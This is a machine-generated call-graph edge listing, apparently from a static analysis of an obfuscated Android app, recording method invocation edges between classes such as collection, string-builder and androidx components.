STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
